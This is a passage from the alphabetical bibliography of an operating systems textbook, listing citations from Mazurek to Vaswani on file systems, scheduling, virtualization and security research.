Books,\r\n2001.\r\nMAZUREK, M.L., THERESKA, E., GUNAW ARDENA, D., HARPER, R., and SCOTT, J.:\r\n‘‘ZZFS: A Hybrid Device and Cloud File System for Spontaneous Users,’’ Proc. 10th\r\nUSENIX Conf. on File and Storage Tech., USENIX, pp. 195–208, 2012.\r\nMCKUSICK, M.K., BOSTIC, K., KARELS, M.J., QUARTERMAN, J.S.: The Design and\r\nImplementation of the 4.4BSD Operating System, Boston: Addison-Wesley, 1996.\r\nMCKUSICK, M.K., and NEVILLE-NEIL, G.V.: The Design and Implementation of the\r\nFr eeBSD Operating System, Boston: Addison-Wesley, 2004.\r\nMCKUSICK, M.K.: ‘‘Disks from the Perspective of a File System,’’ Commun. of the ACM,\r\nvol. 55, pp. 53–55, Nov. 2012.\r\nMEAD, N.R.: ‘‘Who Is Liable for Insecure Systems?’’ Computer, vol. 37, pp. 27–34, July\r\n2004.\r\nMELLOR-CRUMMEY, J.M., and SCOTT, M.L.: ‘‘ Algorithms for Scalable Synchronization\r\non Shared-Memory Multiprocessors,’’ ACM Trans. on Computer Systems, vol. 9, pp.\r\n21–65, Feb. 1991.\n1058 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nMIKHAYLOV, K., and TERVONEN, J.: ‘‘Energy Consumption of the Mobile Wireless Sen\u0002sor Network’s Node with Controlled Mobility,’’ Proc. 27th Int’l Conf. on Advanced\r\nNetworking and Applications Workshops, IEEE, pp. 1582–1587, 2013.\r\nMILOJICIC, D.: ‘‘Security and Privacy,’’ IEEE Concurrency, vol. 8, pp. 70–79, April–June\r\n2000.\r\nMOODY, G.: Rebel Code, Cambridge. MA: Perseus Publishing, 2001.\r\nMOON, S., and REDDY, A.L.N.: ‘‘Don’t Let RAID Raid the Lifetime of Your SSD Array,’’\r\nProc. Fifth USENIX Workshop on Hot Topics in Storage and File Systems, USENIX,\r\n2013.\r\nMORRIS, R., and THOMPSON, K.: ‘‘Password Security: A Case History,’’ Commun. of the\r\nACM, vol. 22, pp. 594–597, Nov. 1979.\r\nMORUZ, G., and NEGOESCU, A.: ‘‘Outperforming LRU Via Competitive Analysis on\r\nParametrized Inputs for Paging,’’ Proc. 23rd ACM-SIAM Symp. on Discrete Algo\u0002rithms, SIAM, pp. 1669–1680.\r\nMOSHCHUK, A., BRAGIN, T., GRIBBLE, S.D., and LEVY, H.M.: ‘‘ A Crawler-Based Study\r\nof Spyware on the Web,’’ Proc. Network and Distributed System Security Symp., Inter\u0002net Society, pp. 1–17, 2006.\r\nMULLENDER, S.J., and TANENBAUM, A.S.: ‘‘Immediate Files,’’ Software Practice and\r\nExperience, vol. 14, pp. 365–368, 1984.\r\nNACHENBERG, C.: ‘‘Computer Virus-Antivirus Coevolution,’’ Commun. of the ACM, vol.\r\n40, pp. 46–51, Jan. 1997.\r\nNARAYANAN, D., N. THERESKA, E., DONNELLY, A., ELNIKETY, S. and ROWSTRON, A.:\r\n‘‘Migrating Server Storage to SSDs: Analysis of Tradeoffs,’’ Proc. Fourth European\r\nConf. on Computer Systems (EUROSYS), ACM, 2009.\r\nNELSON, M., LIM, B.-H., and HUTCHINS, G.: ‘‘Fast Transparent Migration for Virtual\r\nMachines,’’ Proc. USENIX Ann. Tech. Conf., USENIX, pp. 391–394, 2005.\r\nNEMETH, E., SNYDER, G., HEIN, T.R., and WHALEY, B.: UNIX and Linux System Admin\u0002istration Handbook, 4th ed., Upper Saddle River, NJ: Prentice Hall, 2013.\r\nNEWTON, G.: ‘‘Deadlock Prevention, Detection, and Resolution: An Annotated Bibliogra\u0002phy,’’ ACM SIGOPS Operating Systems Rev., vol. 13, pp. 33–44, April 1979.\r\nNIEH, J., and LAM, M.S.: ‘‘ A SMART Scheduler for Multimedia Applications,’’ ACM\r\nTr ans. on Computer Systems, vol. 21, pp. 117–163, May 2003.\r\nNIGHTINGALE, E.B., ELSON, J., FAN, J., HOGMANN, O., HOWELL, J., and SUZUE, Y.:\r\n‘‘Flat Datacenter Storage,’’ Proc. 10th Symp. on Operating Systems Design and Imple\u0002mentation, USENIX, pp. 1–15, 2012.\r\nNIJIM, M., QIN, X., QIU, M., and LI, K.: ‘‘ An Adaptive Energy-conserving Strategy for Par\u0002allel Disk Systems,’’ Future Generation Computer Systems, vol. 29, pp. 196–207, Jan.\r\n2013.\r\nNIST (National Institute of Standards and Technology): FIPS Pub. 180–1, 1995.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1059\r\nNIST (National Institute of Standards and Technology): ‘‘The NIST Definition of Cloud\r\nComputing,’’ Special Publication 800-145, Recommendations of the National Institute\r\nof Standards and Technology, 2011.\r\nNO, J.: ‘‘NAND Flash Memory-Based Hybrid File System for High I/O Performance,’’ J.\r\nParallel and Distributed Computing, vol. 72, pp. 1680–1695, Dec. 2012.\r\nOH, Y., CHOI, J., LEE, D., and NOH, S.H.: ‘‘Caching Less for Better Performance: Balanc\u0002ing Cache Size and Update Cost of Flash Memory Cache in Hybrid Storage Systems,’’\r\nProc. 10th USENIX Conf. on File and Storage Tech., USENIX, pp. 313–326, 2012.\r\nOHNISHI, Y., and YOSHIDA, T.: ‘‘Design and Evaluation of a Distributed Shared Memory\r\nNetwork for Application-Specific PC Cluster Systems,’’ Proc. Workshops of Int’l Conf.\r\non Advanced Information Networking and Applications, IEEE, pp. 63–70, 2011.\r\nOKI, B., PFLUEGL, M., SIEGEL, A., and SKEEN, D.: ‘‘The Information Bus—An Architec\u0002ture for Extensible Distributed Systems,’’ Proc. 14th Symp. on Operating Systems\r\nPrinciples, ACM, pp. 58–68, 1993.\r\nONGARO, D., RUMBLE, S.M., STUTSMAN, R., OUSTERHOUT, J., and ROSENBLUM, M.:\r\n‘‘Fast Crash Recovery in RAMCloud,’’ Proc. 23rd Symp. of Operating Systems Princi\u0002ples, ACM, pp. 29–41, 2011.\r\nORGANICK, E.I.: The Multics System, Cambridge, MA: M.I.T. Press, 1972.\r\nORTOLANI, S., and CRISPO, B.: ‘‘NoisyKey: Tolerating Keyloggers via Keystrokes Hid\u0002ing,’’ Proc. Seventh USENIX Workshop on Hot Topics in Security, USENIX, 2012.\r\nORWICK, P., and SMITH, G.: Developing Drivers with the Windows Driver Foundation,\r\nRedmond, WA: Microsoft Press, 2007.\r\nOSTRAND, T.J., and WEYUKER, E.J.: ‘‘The Distribution of Faults in a Large Industrial\r\nSoftware System,’’ Proc. 2002 ACM SIGSOFT Int’l Symp. on Software Testing and\r\nAnalysis, ACM, pp. 55–64, 2002.\r\nOSTROWICK, J.: Locking Down Linux—An Introduction to Linux Security, Raleigh, NC:\r\nLulu Press, 2013.\r\nOUSTERHOUT, J.K.: ‘‘Scheduling Techniques for Concurrent Systems,’’ Proc. Third Int’l\r\nConf. on Distrib. Computing Systems, IEEE, pp. 22–30, 1982.\r\nOUSTERHOUT, J.L.: ‘‘Why Threads are a Bad Idea (for Most Purposes),’’ Presentation at\r\nProc. USENIX Winter Conf., USENIX, 1996.\r\nPARK, S., and SHEN, K.: ‘‘FIOS: A Fair, Eff icient Flash I/O Scheduler,’’ Proc. 10th\r\nUSENIX Conf. on File and Storage Tech., USENIX, pp. 155–170, 2012.\r\nPATE, S.D.: UNIX Filesystems: Evolution, Design, and Implementation, Hoboken, NJ: John\r\nWiley & Sons, 2003.\r\nPATHAK, A., HU, Y.C., and ZHANG, M.: ‘‘Where Is the Energy Spent inside My App? Fine\r\nGrained Energy Accounting on Smartphones with Eprof,’’ Proc. Seventh European\r\nConf. on Computer Systems (EUROSYS), ACM, 2012.\r\nPATTERSON, D., and HENNESSY, J.: Computer Organization and Design, 5th ed., Burling\u0002ton, MA: Morgan Kaufman, 2013.\n1060 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nPATTERSON, D.A., GIBSON, G., and KATZ, R.: ‘‘ A Case for Redundant Arrays of Inexpen\u0002sive Disks (RAID),’’ Proc. ACM SIGMOD Int’l. Conf. on Management of Data, ACM,\r\npp. 109–166, 1988.\r\nPEARCE, M., ZEADALLY, S., and HUNT, R.: ‘‘Virtualization: Issues, Security Threats, and\r\nSolutions,’’ Computing Surveys, ACM, vol. 45, Art. 17, Feb. 2013.\r\nPENNEMAN, N., KUDINSKLAS, D., RAWSTHORNE, A., DE SUTTER, B., and DE BOSS\u0002CHERE, K.: ‘‘Formal Virtualization Requirements for the ARM Architecture,’’ J. Sys\u0002tem Architecture: the EUROMICRO J., vol. 59, pp. 144–154, March 2013.\r\nPESERICO, E.: ‘‘Online Paging with Arbitrary Associativity,’’ Proc. 14th ACM-SIAM\r\nSymp. on Discrete Algorithms, ACM, pp. 555–564, 2003.\r\nPETERSON, G.L.: ‘‘Myths about the Mutual Exclusion Problem,’’ Information Processing\r\nLetters, vol. 12, pp. 115–116, June 1981.\r\nPETRUCCI, V., and LOQUES, O.: ‘‘Lucky Scheduling for Energy-Efficient Heterogeneous\r\nMulti-core Systems,’’ Proc. USENIX Workshop on Power-Aware Computing and Sys\u0002tems, USENIX, 2012.\r\nPETZOLD, C.: Programming Windows, 6th ed., Redmond, WA: Microsoft Press, 2013.\r\nPIKE, R., PRESOTTO, D., THOMPSON, K., TRICKEY, H., and WINTERBOTTOM, P.:\r\n‘‘The Use of Name Spaces in Plan 9,’’ Proc. 5th ACM SIGOPS European Workshop,\r\nACM, pp. 1–5, 1992.\r\nPOPEK, G.J., and GOLDBERG, R.P.: ‘‘Formal Requirements for Virtualizable Third Gener\u0002ation Architectures,’’ Commun. of the ACM, vol. 17, pp. 412–421, July 1974.\r\nPORTNOY, M.: ‘‘Virtualization Essentials,’’ Hoboken, NJ: John Wiley & Sons, 2012.\r\nPRABHAKAR, R., KANDEMIR, M., and JUNG, M: ‘‘Disk-Cache and Parallelism Aware\r\nI/O Scheduling to Improve Storage System Performance,’’ Proc. 27th Int’l Symp. on\r\nParallel and Distributed Computing, IEEE, pp. 357–368, 2013.\r\nPRECHELT, L.: ‘‘ An Empirical Comparison of Seven Programming Languages,’’ Com\u0002puter, vol. 33, pp. 23–29, Oct. 2000.\r\nPYLA, H., and VARADARAJAN, S.: ‘‘Transparent Runtime Deadlock Elimination,’’ Proc.\r\n21st Int’l Conf. on Parallel Architectures and Compilation Techniques, ACM, pp.\r\n477–478, 2012.\r\nQUIGLEY, E.: UNIX Shells by Example, 4th ed., Upper Saddle River, NJ: Prentice Hall,\r\n2004.\r\nRAJGARHIA, A., and GEHANI, A.: ‘‘Performance and Extension of User Space File Sys\u0002tems,’’ Proc. 2010 ACM Symp. on Applied Computing, ACM, pp. 206–213, 2010.\r\nRASANEH, S., and BANIROSTAM, T.: ‘‘ A New Structure and Routing Algorithm for Opti\u0002mizing Energy Consumption in Wireless Sensor Network for Disaster Management,’’\r\nProc. Fourth Int’l Conf. on Intelligent Systems, Modelling, and Simulation, IEEE, pp.\r\n481–485.\r\nRAVINDRANATH, L., PADHYE, J., AGARWAL, S., MAHAJAN, R., OBERMILLER, I., and\r\nSHAYANDEH, S.: ‘‘ AppInsight: Mobile App Performance Monitoring in the Wild,’’\r\nProc. 10th Symp. on Operating Systems Design and Implementation, USENIX, pp.\r\n107–120, 2012.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1061\r\nRECTOR, B.E., and NEWCOMER, J.M.: Win32 Programming, Boston: Addison-Wesley,\r\n1997.\r\nREEVES, R.D.: Windows 7 Device Driver, Boston: Addison-Wesley, 2010.\r\nRENZELMANN, M.J., KADAV , A., and SWIFT, M.M.: ‘‘SymDrive: Testing Drivers without\r\nDevices,’’ Proc. 10th Symp. on Operating Systems Design and Implementation,\r\nUSENIX, pp. 279–292, 2012.\r\nRIEBACK, M.R., CRISPO, B., and TANENBAUM, A.S.: ‘‘Is Your Cat Infected with a Com\u0002puter Virus?,’’ Proc. Fourth IEEE Int’l Conf. on Pervasive Computing and Commun.,\r\nIEEE, pp. 169–179, 2006.\r\nRITCHIE, D.M., and THOMPSON, K.: ‘‘The UNIX Timesharing System,’’ Commun. of the\r\nACM, vol. 17, pp. 365–375, July 1974.\r\nRIVEST, R.L., SHAMIR, A., and ADLEMAN, L.: ‘‘On a Method for Obtaining Digital Sig\u0002natures and Public Key Cryptosystems,’’ Commun. of the ACM, vol. 21, pp. 120–126,\r\nFeb. 1978.\r\nRIZZO, L.: ‘‘Netmap: A Novel Framework for Fast Packet I/O,’’ Proc. USENIX Ann. Tech.\r\nConf., USENIX, 2012.\r\nROBBINS, A: UNIX in a Nutshell, Sebastopol, CA: O’Reilly & Associates, 2005.\r\nRODRIGUES, E.R., NAV AUX, P.O., PANETTA, J., and MENDES, C.L.: ‘‘ A New Technique\r\nfor Data Privatization in User-Level Threads and Its Use in Parallel Applications,’’\r\nProc. 2010 Symp. on Applied Computing, ACM, pp. 2149–2154, 2010.\r\nRODRIGUEZ-LUJAN, I., BAILADOR, G., SANCHEZ-AVILA, C., HERRERO, A., and\r\nVIDAL-DE-MIGUEL, G.: ‘‘ Analysis of Pattern Recognition and Dimensionality Reduc\u0002tion Techniques for Odor Biometrics,’’ vol. 52, pp. 279–289, Nov. 2013.\r\nROSCOE, T., ELPHINSTONE, K., and HEISER, G.: ‘‘Hype and Virtue,’’ Proc. 11th Work\u0002shop on Hot Topics in Operating Systems, USENIX, pp. 19–24, 2007.\r\nROSENBLUM, M., BUGNION, E., DEVINE, S. and HERROD, S.A.: ‘‘Using the SIMOS\r\nMachine Simulator to Study Complex Computer Systems,’’ ACM Trans. Model. Com\u0002put. Simul., vol. 7, pp. 78–103, 1997.\r\nROSENBLUM, M., and GARFINKEL, T.: ‘‘Virtual Machine Monitors: Current Technology\r\nand Future Trends,’’ Computer, vol. 38, pp. 39–47, May 2005.\r\nROSENBLUM, M., and OUSTERHOUT, J.K.: ‘‘The Design and Implementation of a Log\u0002Structured File System,’’ Proc. 13th Symp. on Operating Systems Principles, ACM, pp.\r\n1–15, 1991.\r\nROSSBACH, C.J., CURREY, J., SILBERSTEIN, M., RAY, and B., WITCHEL, E.: ‘‘PTask:\r\nOperating System Abstractions to Manage GPUs as Compute Devices,’’ Proc. 23rd\r\nSymp. of Operating Systems Principles, ACM, pp. 233–248, 2011.\r\nROSSOW, C., ANDRIESSE, D., WERNER, T., STONE-GROSS, B., PLOHMANN, D., DIET\u0002RICH, C.J., and BOS, H.: ‘‘SoK: P2PWNED—Modeling and Evaluating the Resilience\r\nof Peer-to-Peer Botnets,’’ Proc. IEEE Symp. on Security and Privacy, IEEE, pp.\r\n97–111, 2013.\n1062 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nROZIER, M., ABROSSIMOV, V., ARMAND, F., BOULE, I., GIEN, M., GUILLEMONT, M.,\r\nHERRMANN, F., KAISER, C., LEONARD, P., LANGLOIS, S., and NEUHAUSER, W.:\r\n‘‘Chorus Distributed Operating Systems,’’ Computing Systems, vol. 1, pp. 305–379,\r\nOct. 1988.\r\nRUSSINOVICH, M., and SOLOMON, D.: Windows Internals, Part 1, Redmond, WA:\r\nMicrosoft Press, 2012.\r\nRYZHYK, L., CHUBB, P., KUZ, I., LE SUEUR, E., and HEISER, G.: ‘‘ Automatic Device\r\nDriver Synthesis with Termite,’’ Proc. 22nd Symp. on Operating Systems Principles,\r\nACM, 2009.\r\nRYZHYK, L., KEYS, J., MIRLA, B., RAGNUNATH, A., VIJ, M., and HEISER, G.:\r\n‘‘Improved Device Driver Reliability through Hardware Verification Reuse,’’ Proc.\r\n16th Int’l Conf. on Arc h. Support for Prog. Lang. and Operating Systems, ACM, pp.\r\n133–134, 2011.\r\nSACKMAN, H., ERIKSON, W.J., and GRANT, E.E.: ‘‘Exploratory Experimental Studies\r\nComparing Online and Offline Programming Performance,’’ Commun. of the ACM,\r\nvol. 11, pp. 3–11, Jan. 1968.\r\nSAITO, Y., KARAMANOLIS, C., KARLSSON, M., and MAHALINGAM, M.: ‘‘Taming\r\nAggressive Replication in the Pangea Wide-Area File System,’’ Proc. Fifth Symp. on\r\nOperating Systems Design and Implementation, USENIX, pp. 15–30, 2002.\r\nSALOMIE T.-I., SUBASU, I.E., GICEVA, J., and ALONSO, G.: ‘‘Database Engines on Multi\u0002cores: Why Parallelize When You can Distribute?,’’ Proc. Sixth European Conf. on\r\nComputer Systems (EUROSYS), ACM, pp. 17–30, 2011.\r\nSALTZER, J.H.: ‘‘Protection and Control of Information Sharing in MULTICS,’’ Commun.\r\nof the ACM, vol. 17, pp. 388–402, July 1974.\r\nSALTZER, J.H., and KAASHOEK, M.F.: Principles of Computer System Design: An Intro\u0002duction, Burlington, MA: Morgan Kaufmann, 2009.\r\nSALTZER, J.H., REED, D.P., and CLARK, D.D.: ‘‘End-to-End Arguments in System\r\nDesign,’’ ACM Trans. on Computer Systems, vol. 2, pp. 277–288, Nov. 1984.\r\nSALTZER, J.H., and SCHROEDER, M.D.: ‘‘The Protection of Information in Computer\r\nSystems,’’ Proc. IEEE, vol. 63, pp. 1278–1308, Sept. 1975.\r\nSALUS, P.H.: ‘‘UNIX At 25,’’ Byte, vol. 19, pp. 75–82, Oct. 1994.\r\nSASSE, M.A.: ‘‘Red-Eye Blink, Bendy Shuffle, and the Yuck Factor: A User Experience of\r\nBiometric Airport Systems,’’ IEEE Security and Privacy, vol. 5, pp. 78–81, May/June\r\n2007.\r\nSCHEIBLE, J.P.: ‘‘ A Survey of Storage Options,’’ Computer, vol. 35, pp. 42–46, Dec. 2002.\r\nSCHINDLER, J., SHETE, S., and SMITH, K.A.: ‘‘Improving Throughput for Small Disk\r\nRequests with Proximal I/O,’’ Proc. Ninth USENIX Conf. on File and Storage Tech.,\r\nUSENIX, pp. 133–148, 2011.\r\nSCHWARTZ, C., PRIES, R., and TRAN-GIA, P.: ‘‘ A Queuing Analysis of an Energy-Saving\r\nMechanism in Data Centers,’’ Proc. 2012 Int’l Conf. on Inf. Networking, IEEE, pp.\r\n70–75, 2012.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1063\r\nSCOTT, M., LEBLANC, T., and MARSH, B.: ‘‘Multi-Model Parallel Programming in Psy\u0002che,’’ Proc. Second ACM Symp. on Principles and Practice of Parallel Programming,\r\nACM, pp. 70–78, 1990.\r\nSEAWRIGHT, L.H., and MACKINNON, R.A.: ‘‘VM/370—A Study of Multiplicity and Use\u0002fulness,’’ IBM Systems J., vol. 18, pp. 4–17, 1979.\r\nSEREBRYANY, K., BRUENING, D., POTAPENKO, A., and VYUKOV, D.: ‘‘ AddressSanitizer:\r\nA Fast Address Sanity Checker,’’ Proc. USENIX Ann. Tech. Conf., USENIX, pp.\r\n28–28, 2013.\r\nSEVERINI, M., SQUARTINI, S., and PIAZZA, F.: ‘‘ An Energy Aware Approach for Task\r\nScheduling in Energy-Harvesting Sensor Nodes,’’ Proc. Ninth Int’l Conf. on Advances\r\nin Neural Networks, Springer-Verlag, pp. 601–610, 2012.\r\nSHEN, K., SHRIRAMAN, A., DWARKADAS, S., ZHANG, X., and CHEN, Z.: ‘‘Power Con\u0002tainers: An OS Facility for Fine-Grained Power and Energy Management on Multicore\r\nServers,’’ Proc. 18th Int’l Conf. on Arc h. Support for Prog. Lang. and Operating Sys\u0002tems, ACM, pp. 65–76, 2013.\r\nSILBERSCHATZ, A., GALVIN, P.B., and GAGNE, G.: Operating System Concepts, 9th ed.,\r\nHoboken, NJ: John Wiley & Sons, 2012.\r\nSIMON, R.J.: Windows NT Win32 API SuperBible, Corte Madera, CA: Sams Publishing,\r\n1997.\r\nSITARAM, D., and DAN, A.: Multimedia Servers, Burlington, MA: Morgan Kaufman, 2000.\r\nSLOWINSKA, A., STANESCU, T., and BOS, H.: ‘‘Body Armor for Binaries: Preventing\r\nBuffer Overflows Without Recompilation,’’ Proc. USENIX Ann. Tech. Conf., USENIX,\r\n2012.\r\nSMALDONE, S., WALLACE, G., and HSU, W.: ‘‘Efficiently Storing Virtual Machine Back\u0002ups,’’ Proc. Fifth USENIX Conf. on Hot Topics in Storage and File Systems, USENIX,\r\n2013.\r\nSMITH, D,K., and ALEXANDER, R.C.: Fumbling the Future: How Xerox Invented, Then\r\nIgnored, the First Personal Computer, New York: William Morrow, 1988.\r\nSNIR, M., OTTO, S.W., HUSS-LEDERMAN, S., WALKER, D.W., and DONGARRA, J.: MPI:\r\nThe Complete Reference Manual, Cambridge, MA: M.I.T. Press, 1996.\r\nSNOW, K., MONROSE, F., DAVI, L., DMITRIENKO, A., LIEBCHEN, C., and SADEGHI,\r\nA.-R.: ‘‘Just-In-Time Code Reuse: On the Effectiveness of Fine-Grained Address\r\nSpace Layout Randomization,’’ Proc. IEEE Symp. on Security and Privacy, IEEE, pp.\r\n574–588, 2013.\r\nSOBELL, M.: A Practical Guide to Fedora and Red Hat Enterprise Linux, 7th ed., Upper\r\nSaddle River, NJ: Prentice-Hall, 2014.\r\nSOORTY, B.: ‘‘Evaluating IPv6 in Peer-to-peer Gigabit Ethernet for UDP Using Modern\r\nOperating Systems,’’ Proc. 2012 Symp. on Computers and Commun., IEEE, pp.\r\n534–536, 2012.\r\nSPAFFORD, E., HEAPHY, K., and FERBRACHE, D.: Computer Viruses, Arlington, VA:\r\nADAPSO, 1989.\n1064 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nSTALLINGS, W.: Operating Systems, 7th ed., Upper Saddle River, NJ: Prentice Hall, 2011.\r\nSTAN, M.R., and SKADRON, K: ‘‘Power-Aware Computing,’’ Computer, vol. 36, pp.\r\n35–38, Dec. 2003.\r\nSTEINMETZ, R., and NAHRSTEDT, K.: Multimedia: Computing, Communications and\r\nApplications, Upper Saddle River, NJ: Prentice Hall, 1995.\r\nSTEVENS, R.W., and RAGO, S.A.: ‘‘ Advanced Programming in the UNIX Environment,’’\r\nBoston: Addison-Wesley, 2013.\r\nSTOICA, R., and AILAMAKI, A.: ‘‘Enabling Efficient OS Paging for Main-Memory OLTP\r\nDatabases,’’ Proc. Ninth Int’l Workshop on Data Management on New Hardware,\r\nACM, Art. 7. 2013.\r\nSTONE, H.S., and BOKHARI, S.H.: ‘‘Control of Distributed Processes,’’ Computer, vol. 11,\r\npp. 97–106, July 1978.\r\nSTORER, M.W., GREENAN, K.M., MILLER, E.L., and VORUGANTI, K.: ‘‘POTSHARDS:\r\nSecure Long-Term Storage without Encryption,’’ Proc. USENIX Ann. Tech. Conf.,\r\nUSENIX, pp. 143–156, 2007.\r\nSTRATTON, J.A., RODRIGUES, C., SUNG, I.-J., CHANG, L.-W., ANSSARI, N., LIU, G.,\r\nHWU, W.-M., and OBEID, N.: ‘‘ Algorithm and Data Optimization Techniques for Scal\u0002ing to Massively Threaded Systems,’’ Computer, vol. 45, pp. 26–32, Aug. 2012.\r\nSUGERMAN, J., VENKITACHALAM , G., and LIM, B.-H: ‘‘Virtualizing I/O Devices on\r\nVMware Workstation’s Hosted Virtual Machine Monitor,’’ Proc. USENIX Ann. Tech.\r\nConf., USENIX, pp. 1–14, 2001.\r\nSULTANA, S., and BERTINO, E.: ‘‘ A File Provenance System,’’ Proc. Third Conf. on Data\r\nand Appl. Security and Privacy, ACM, pp. 153–156, 2013.\r\nSUN, Y., CHEN, M., LIU, B., and MAO, S.: ‘‘FAR: A Fault-Avoidance Routing Method for\r\nData Center Networks with Regular Topology,’’ Proc. Ninth ACM/IEEE Symp. for\r\nArch. for Networking and Commun. Systems, ACM, pp. 181–190, 2013.\r\nSWANSON, S., and CAULFIELD, A.M.: ‘‘Refactor, Reduce, Recycle: Restructuring the I/O\r\nStack for the Future of Storage,’’ Computer, vol. 46, pp. 52–59, Aug. 2013.\r\nTAIABUL HAQUE, S.M., WRIGHT, M., and SCIELZO, S.: ‘‘ A Study of User Password\r\nStrategy for Multiple Accounts,’’ Proc. Third Conf. on Data and Appl. Security and\r\nPrivacy, ACM, pp. 173–176, 2013.\r\nTALLURI, M., HILL, M.D., and KHALIDI, Y.A.: ‘‘ A New Page Table for 64-Bit Address\r\nSpaces,’’ Proc. 15th Symp. on Operating Systems Principles, ACM, pp. 184–200,\r\n1995.\r\nTAM, D., AZIMI, R., and STUMM, M.: ‘‘Thread Clustering: Sharing-Aware Scheduling,’’\r\nProc. Second European Conf. on Computer Systems (EUROSYS), ACM, pp. 47–58,\r\n2007.\r\nTANENBAUM, A.S., and AUSTIN, T.: Structured Computer Organization, 6th ed., Upper\r\nSaddle River, NJ: Prentice Hall, 2012.\r\nTANENBAUM, A.S., HERDER, J.N., and BOS, H.: ‘‘File Size Distribution on UNIX Sys\u0002tems: Then and Now,’’ ACM SIGOPS Operating Systems Rev., vol. 40, pp. 100–104,\r\nJan. 2006.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1065\r\nTANENBAUM, A.S., VAN RENESSE, R., VAN STAVEREN, H., SHARP, G.J., MULLENDER,\r\nS.J., JANSEN, J., and VAN ROSSUM, G.: ‘‘Experiences with the Amoeba Distributed\r\nOperating System,’’ Commun. of the ACM, vol. 33, pp. 46–63, Dec. 1990.\r\nTANENBAUM, A.S., and VAN STEEN, M.R.: Distributed Systems, 2nd ed., Upper Saddle\r\nRiver, NJ: Prentice Hall, 2007.\r\nTANENBAUM, A.S., and WETHERALL, D.J: Computer Networks, 5th ed., Upper Saddle\r\nRiver, NJ: Prentice Hall, 2010.\r\nTANENBAUM, A.S., and WOODHULL, A.S.: Operating Systems: Design and Implementa\u0002tion, 3rd ed., Upper Saddle River, NJ: Prentice Hall, 2006.\r\nTARASOV, V., HILDEBRAND, D., KUENNING, G., and ZADOK, E.: ‘‘Virtual Machine\r\nWorkloads: The Case for New NAS Benchmarks,’’ Proc. 11th Conf. on File and Stor\u0002age Technologies, USENIX, 2013.\r\nTEORY, T.J.: ‘‘Properties of Disk Scheduling Policies in Multiprogrammed Computer Sys\u0002tems,’’ Proc. AFIPS Fall Joint Computer Conf., AFIPS, pp. 1–11, 1972.\r\nTHEODOROU, D., MAK, R.H., KEIJSER, J.J., and SUERINK, R.: ‘‘NRS: A System for\r\nAutomated Network Virtualization in IAAS Cloud Infrastructures,’’ Proc. Seventh Int’l\r\nWorkshop on Virtualization Tech. in Distributed Computing, ACM, pp. 25–32, 2013.\r\nTHIBADEAU, R.: ‘‘Trusted Computing for Disk Drives and Other Peripherals,’’ IEEE Secu\u0002rity and Privacy, vol. 4, pp. 26–33, Sept./Oct. 2006.\r\nTHOMPSON, K.: ‘‘Reflections on Trusting Trust,’’ Commun. of the ACM, vol. 27, pp.\r\n761–763, Aug. 1984.\r\nTIMCENKO, V., and DJORDJEVIC, B.: ‘‘The Comprehensive Performance Analysis of\r\nStriped Disk Array Organizations—RAID-0,’’ Proc. 2013 Int’l Conf. on Inf. Systems\r\nand Design of Commun., ACM, pp. 113–116, 2013.\r\nTRESADERN, P., COOTES, T., POH, N., METEJKA, P., HADID, A., LEVY, C., MCCOOL,\r\nC., and MARCEL, S.: ‘‘Mobile Biometrics: Combined Face and Voice Verification for a\r\nMobile Platform,’’ IEEE Pervasive Computing, vol. 12, pp. 79–87, Jan. 2013.\r\nTSAFRIR, D., ETSION, Y., FEITELSON, D.G., and KIRKPATRICK, S.: ‘‘System Noise, OS\r\nClock Ticks, and Fine-Grained Parallel Applications,’’ Proc. 19th Ann. Int’l Conf. on\r\nSupercomputing, ACM, pp. 303–312, 2005.\r\nTUAN-ANH, B., HUNG, P.P., and HUH, E.-N.: ‘‘ A Solution of Thin-Thick Client Collabora\u0002tion for Data Distribution and Resource Allocation in Cloud Computing,’’ Proc. 2013\r\nInt’l Conf. on Inf. Networking, IEEE, pp. 238–243, 2103.\r\nTUCKER, A., and GUPTA, A.: ‘‘Process Control and Scheduling Issues for Multipro\u0002grammed Shared-Memory Multiprocessors,’’ Proc. 12th Symp. on Operating Systems\r\nPrinciples, ACM, pp. 159–166, 1989.\r\nUHLIG, R., NAGLE, D., STANLEY, T., MUDGE, T., SECREST, S., and BROWN, R.: ‘‘Design\r\nTradeoffs for Software-Managed TLBs,’’ ACM Trans. on Computer Systems, vol. 12,\r\npp. 175–205, Aug. 1994.\r\nUHLIG, R. NEIGER, G., RODGERS, D., SANTONI, A.L., MARTINS, F.C.M., ANDERSON,\r\nA.V., BENNET, S.M., KAGI, A., LEUNG, F.H., and SMITH, L.: ‘‘Intel Virtualization\r\nTechnology,’’ Computer, vol. 38, pp. 48–56, 2005.\n1066 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nUR, B., KELLEY, P.G., KOMANDURI, S., LEE, J., MAASS, M., MAZUREK, M.L., PAS\u0002SARO, T., SHAY, R., VIDAS, T., BAUER, L., CHRISTIN, N., and CRANOR, L.F.: ‘‘How\r\nDoes Your Password Measure Up? The Effect of Strength Meters on Password Cre\u0002ation,’’ Proc. 21st USENIX Security Symp., USENIX, 2012.\r\nVA GHANI, S.B.: ‘‘Virtual Machine File System,’’ ACM SIGOPS Operating Systems Rev.,\r\nvol. 44, pp. 57–70, 2010.\r\nVAHALIA, U.: UNIX Internals—The New Frontiers, Upper Saddle River, NJ: Prentice Hall,\r\n2007.\r\nVAN DOORN, L.: The Design and Application of an Extensible Operating System, Capelle\r\na/d Ijssel: Labyrint Publications, 2001.\r\nVAN MOOLENBROEK, D.C., APPUSWAMY, R., and TANENBAUM, A.S.: ‘‘Integrated Sys\u0002tem and Process Crash Recovery in the Loris Storage Stack,’’ Proc. Seventh Int’l Conf.\r\non Networking, Arc hitecture, and Storage, IEEE, pp. 1–10, 2012.\r\nVAN ’T NOORDENDE, G., BALOGH, A., HOFMAN, R., BRAZIER, F.M.T., and TANEN\u0002BAUM, A.S.: ‘‘ A Secure Jailing System for Confining Untrusted Applications,’’ Proc.\r\nSecond Int’l Conf. on Security and Cryptography, INSTICC, pp. 414–423, 2007.\r\nVASWANI, R., and ZAHORJAN, J.: ‘‘The Implications of Cache Affinity on Processor\r\nScheduling for Multiprogrammed 